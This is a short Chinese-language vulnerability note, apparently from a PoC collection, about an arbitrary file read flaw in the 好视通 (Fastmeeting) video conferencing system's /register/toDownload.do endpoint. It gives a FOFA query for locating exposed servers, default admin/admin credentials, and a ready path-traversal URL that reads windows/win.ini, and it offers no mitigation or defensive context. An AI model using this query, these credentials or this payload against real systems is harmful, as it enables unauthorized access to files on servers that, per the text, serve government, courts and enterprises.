## 好视通视频会议系统 toDownload.do接口任意文件读取漏洞
好视通 是国内云视频会议知名品牌，拥有多项创新核心技术优势、多方通信服务牌照及行业全面资质 ，专注为政府、公检法司、教育、集团企业等用户提供“云+端+业务全场景”解决方案。其视频会议系统的路径(fastmeeting) /register/toDownload.do?fileName= 存在任意文件遍历漏洞，可通过fileName参数读取任意文件。 

弱口令admin/admin

## fofa
```
"深圳银澎云计算有限公司"
```

## poc
```
/register/toDownload.do?fileName=敏感文件路径
https://xxxxxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini

```


